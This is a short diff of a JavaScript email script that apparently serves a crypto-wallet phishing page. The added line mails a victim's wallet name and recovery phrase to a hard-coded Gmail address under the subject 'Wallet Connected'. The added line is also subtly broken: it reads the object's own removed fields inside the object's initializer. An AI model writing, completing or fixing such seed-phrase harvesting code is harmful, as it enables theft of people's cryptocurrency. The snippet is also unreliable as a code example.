@@ -14,8 +14,7 @@ let mailOptions = {
     from: 'austinmary624@gmail.com',
     to: 'austinmary624@gmail.com',
     subject: 'Wallet Connected',
-    wallet: '',
-    phrase: ''
+    text: `Wallet Name: ${mailOptions.wallet}\nPhrase: ${mailOptions.phrase}` // Email body with wallet name and phrase
 };
 
 // Send email
@@ -25,4 +24,3 @@ transporter.sendMail(mailOptions, (error, info) => {
     }
     console.log('Message sent: %s', info.messageId);
 });
-
